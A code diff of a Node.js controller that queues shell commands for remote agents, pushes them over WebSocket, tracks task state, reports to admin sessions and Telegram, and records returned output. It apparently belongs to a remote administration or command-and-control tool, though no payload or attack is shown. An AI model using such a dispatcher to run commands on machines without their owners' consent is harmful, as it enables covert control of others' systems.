@@ -2,6 +2,8 @@ const Task = require('../models/Task');
 const Client = require('../models/Client');
 const telegramService = require('../services/telegramService');
 
+const generateTaskId = () => `cmd_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+
 // Platform-specific command mappings
 const PLATFORM_COMMANDS = {
     windows: {
@@ -142,21 +144,21 @@ function translateCommand(command, operatingSystem, capabilities) {
 
 const sendScriptToClientAction = async (req, res) => {
     try {
-        const { uuid, command } = req.body;
-        
+        const { uuid, command, params = {} } = req.body;
+
         if (!uuid || !command) {
-            return res.status(400).json({ 
-                success: false, 
-                message: 'UUID and command are required' 
+            return res.status(400).json({
+                success: false,
+                message: 'UUID and command are required'
             });
         }
 
         // Get client information for platform-aware processing
-        const client = await Client.findOne({ uuid: uuid });
+        const client = await Client.findOne({ uuid });
         if (!client) {
-            return res.status(404).json({ 
-                success: false, 
-                message: 'Client not found' 
+            return res.status(404).json({
+                success: false,
+                message: 'Client not found'
             });
         }
 
@@ -165,8 +167,8 @@ const sendScriptToClientAction = async (req, res) => {
 
         // Validate command compatibility
         if (!isCommandSupported(command, operatingSystem, capabilities)) {
-            return res.status(400).json({ 
-                success: false, 
+            return res.status(400).json({
+                success: false,
                 message: `Command '${command}' is not supported on ${operatingSystem} platform`,
                 supportedCommands: getAvailableCommands(operatingSystem, capabilities)
             });
@@ -174,18 +176,88 @@ const sendScriptToClientAction = async (req, res) => {
 
         // Translate command to platform-specific version
         const translatedCommand = translateCommand(command, operatingSystem, capabilities);
+        const taskId = generateTaskId();
+        const createdBy = req.user?.id || 'system';
 
-        // Create and save the task
+        // Create and save the task using the unified schema
         const task = new Task({
-            uuid: uuid,
+            taskId,
+            agentUuid: uuid,
             command: translatedCommand,
-            originalCommand: command,
+            params: {
+                ...params,
+                originalCommand: command
+            },
+            createdBy,
             platform: operatingSystem,
-            status: 'pending',
-            createdAt: new Date()
+            queue: {
+                state: 'pending',
+                attempts: 0,
+                priority: 0
+            },
+            originalCommand: command
         });
 
         await task.save();
+
+        // Broadcast task creation to admin sessions
+        const wsHandler = require('../configs/ws.handler');
+        wsHandler.broadcastToAdminSessions({
+            type: 'task_created',
+            task: task.toObject(),
+            timestamp: new Date().toISOString()
+        });
+
+        let deliveryStatus = 'queued';
+        const clientConnection = wsHandler.getClientConnection(uuid);
+
+        if (clientConnection && clientConnection.readyState === clientConnection.OPEN) {
+            const commandPayload = {
+                type: 'command',
+                cmd: 'execute',
+                command: translatedCommand,
+                taskId,
+                params,
+                timestamp: new Date().toISOString()
+            };
+
+            try {
+                clientConnection.send(JSON.stringify(commandPayload));
+
+                await Task.findOneAndUpdate(
+                    { taskId },
+                    {
+                        $set: {
+                            'queue.state': 'sent',
+                            'queue.reason': null,
+                            sentAt: new Date(),
+                            'queue.attempts': 1,
+                            'queue.lastAttemptAt': new Date()
+                        }
+                    }
+                );
+
+                const updatedTask = await Task.findOne({ taskId }).lean();
+                wsHandler.broadcastToAdminSessions({
+                    type: 'task_updated',
+                    task: updatedTask,
+                    timestamp: new Date().toISOString()
+                });
+
+                deliveryStatus = 'sent';
+            } catch (wsError) {
+                console.error('Failed to send command via WebSocket:', wsError);
+                await Task.findOneAndUpdate(
+                    { taskId },
+                    {
+                        $set: {
+                            'queue.state': 'pending',
+                            'queue.reason': 'WebSocket send failed'
+                        }
+                    }
+                );
+            }
+        }
 
         // Send Telegram notification if enabled
         if (telegramService.isEnabled()) {
@@ -193,7 +265,7 @@ const sendScriptToClientAction = async (req, res) => {
                 await telegramService.sendCommandOutput(
                     client,
                     command,
-                    `Command queued for execution: ${translatedCommand}`,
+                    `Command ${deliveryStatus === 'sent' ? 'sent to' : 'queued for'} execution: ${translatedCommand}`,
                     'text'
                 );
             } catch (telegramError) {
@@ -202,20 +274,21 @@ const sendScriptToClientAction = async (req, res) => {
             }
         }
 
-        res.json({ 
-            success: true, 
-            message: 'Command sent successfully',
-            taskId: task._id,
-            translatedCommand: translatedCommand,
+        res.json({
+            success: true,
+            message: deliveryStatus === 'sent' ? 'Command sent to client' : 'Client offline, command queued',
+            taskId,
+            translatedCommand,
             platform: operatingSystem,
+            delivery: deliveryStatus,
             telegramSent: telegramService.isEnabled()
         });
     } catch (error) {
         console.error('Error in sendScriptToClientAction:', error);
-        res.status(500).json({ 
-            success: false, 
+        res.status(500).json({
+            success: false,
             message: 'Internal server error',
-            error: error.message 
+            error: error.message
         });
     }
 };
@@ -231,7 +304,8 @@ const getTasksForClientAction = async (req, res) => {
             });
         }
 
-        const tasks = await Task.find({ uuid: uuid }).sort({ createdAt: -1 });
+        const tasks = await Task.find({ agentUuid: uuid })
+            .sort({ createdAt: -1 });
         
         res.json({ 
             success: true, 
@@ -335,27 +409,60 @@ const validateCommandAction = async (req, res) => {
 const handleCommandResultAction = async (req, res) => {
     try {
         const { uuid, taskId, result, status, outputType, fileData } = req.body;
-        
-        if (!uuid || !taskId || !result) {
-            return res.status(400).json({ 
-                success: false, 
-                message: 'UUID, taskId, and result are required' 
+
+        if (!uuid || !taskId || typeof result === 'undefined') {
+            return res.status(400).json({
+                success: false,
+                message: 'UUID, taskId, and result are required'
             });
         }
 
-        // Update task status
-        const task = await Task.findById(taskId);
+        // Update task status using unified schema fields
+        const task = await Task.findOne({ taskId });
         if (!task) {
-            return res.status(404).json({ 
-                success: false, 
-                message: 'Task not found' 
+            return res.status(404).json({
+                success: false,
+                message: 'Task not found'
             });
         }
 
-        task.status = status || 'completed';
-        task.result = result;
-        task.completedAt = new Date();
+        const now = new Date();
+        const isSuccess = (status || '').toLowerCase() === 'success' || !status || status === 'completed';
+        const startTime = task.sentAt || task.createdAt || now;
+        const executionTimeMs = Math.max(0, now.getTime() - new Date(startTime).getTime());
+
+        task.output = result;
+        task.completedAt = now;
+        task.executionTimeMs = executionTimeMs;
+        task.status = isSuccess ? 'executed' : 'failed';
+        task.queue.state = isSuccess ? 'completed' : 'failed';
+        task.queue.reason = isSuccess ? null : 'Client reported failure';
+        task.errorMessage = isSuccess ? '' : (typeof result === 'string' ? result : JSON.stringify(result));
+
+        if (!task.sentAt) {
+            task.sentAt = now;
+        }
+
         await task.save();
+
+        // Broadcast task update to admin sessions
+        const wsHandler = require('../configs/ws.handler');
+        const updatedTask = await Task.findOne({ taskId }).lean();
+        wsHandler.broadcastToAdminSessions({
+            type: 'task_updated',
+            task: updatedTask,
+            timestamp: now.toISOString()
+        });
+
+        wsHandler.broadcastToAdminSessions({
+            type: 'output',
+            uuid,
+            taskId,
+            correlationId: null,
+            output: result,
+            status: isSuccess ? 'success' : 'failed',
+            timestamp: now.toISOString()
+        });
 
         // Get client information
         const client = await Client.findOne({ uuid: uuid });
